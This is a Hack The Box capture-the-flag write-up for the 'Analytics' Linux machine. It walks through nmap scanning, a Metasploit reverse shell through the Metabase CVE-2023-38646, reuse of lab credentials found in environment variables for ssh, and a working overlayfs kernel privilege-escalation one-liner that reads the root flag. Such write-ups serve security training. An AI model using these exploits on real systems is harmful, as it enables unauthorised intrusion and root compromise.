Analytics is an HTB machine, running on **Linux**. In it we use **`nmap`** to perform reconnaissance, them exploit** a known CVE in the **`Metabase`** service, with a little help from **`msfconsole`**, to get a foothold on the machine as the `Metabase` service user. We then find plaintext user credentials in the **environment variables** and use it to `ssh` onto the machine as this user. Finally, we use a vulnerability in the **kernel** version to escalate our privileges to root and find the root flag.

## Reconnaissance
We'll use `nmap` to get an overview of listening ports and a more involved scan for port 80. It returns the following results.

```zsh
sudo nmap {ip}
sudo nmap {ip} -p80 -sV -sC
```
```
PORT   STATE SERVICE
22/tcp open  ssh
.
.
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Since we've found a domain, we'll add `analytical.htb` to our `/etc/hosts` file so we can easily open it in our browser.
```
sudo sh -c 'echo "{ip} analytical.htb" >> /etc/hosts'
```

There we find a static website with no interesting elements on first inspection, except for a 'Log In'-button, which takes us to `data.analytical.htb`. This page contains a login-screen for a service called `Metabase`. 

Since we have no user credentials and we've exhausted all the leads as of now, this concludes the reconnaissance.

## Gaining a foothold on the machine
We'll start by searching for known exploits of this `Metabase` service, since that's our most solid lead. We find [CVE 2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646) which allows RCE on versions <= 0.46.6.1 or 1.46.6.1 and a [Metasploit module](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/linux/http/metabase_setup_token_rce.rb) that exploits it. 

Using Metasploit (`msfconsole`), selecting this specific exploit and supplying the ip-address and port number, we'll verify whether the service on this machine is indeed vulnerable. It is, so we'll execute the Metasploit module and setup a reverse shell. 

Our reverse shell gets us a foothold on the machine as the user `metabase`. This user does not have any flag in its home directory, so to find the user flag we'll need to perform some horizontal movement on the machine and get a shell as another user. 

## Horizontal movement and user pwn
When we enumerate the the environment variables with `env`, we'll find that it contains plaintext user credentials for a user called `metalyzer` in the `Metabase` database.

`metalytics@analytical.htb::An4lytics_ds20223#`

These seem to be credentials for the `Metabase` service log-in screen we found at `data.analytical.htb`. Indeed, we can login successfully.

However, we do not find anything useful when logged in to this service, that could help us get a shell as another user. We'll instead see if this `metalyzer` user reuses this username and password on the machine itself. Using `ssh` and the same credentials, we'll see that this is indeed the case and with a shell as user `metalyzer` we can view the `user.txt` flag.

## Privilege escalation to root
Enumeration reveals that the kernel version of this machine is vulnerable for privilege escalation from user to root. Explanation and steps are explained [in this reddit post](https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/). While we're at it, we'll edit the exploit code to `cat` out the `root.txt` flag.

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cat /root/root.txt
")'
```